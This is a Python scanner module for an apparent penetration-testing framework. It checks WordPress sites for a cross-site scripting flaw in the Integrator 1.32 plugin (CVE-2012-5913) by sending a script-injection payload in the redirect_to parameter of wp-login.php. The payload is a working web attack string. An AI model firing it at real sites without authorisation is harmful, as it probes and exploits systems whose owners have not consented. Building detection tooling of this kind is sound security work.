#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in wp-integrator."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Integrator 1.32 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in wp-integrator.php in the WordPress Integrator module 1.32 for WordPress allows remote attackers to inject arbitrary web script or HTML via the redirect_to parameter to wp-login.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'wordpress', 'xss', 'wp-plugin', 'packetstorm', 'wordpress_integrator_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-5913',
            'https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-integrator-redirect_to-parameter-cross-site-scripting-1-32/',
            'http://packetstormsecurity.org/files/111249/WordPress-Integrator-1.32-Cross-Site-Scripting.html',
            'http://www.darksecurity.de/advisories/2012/SSCHADV2012-010.txt',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/74475',
        ],
        'cve': 'CVE-2012-5913',
    }

    def run(self):
        path = '/wp-content/plugins/wp-integrator/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Wordpress Integrator',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-login.php?redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</sCripT><sCripT>alert(document.domain)</sCripT>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Integrator 1.32 - Cross-Site Scripting detected', path=path)
            return True
        return False

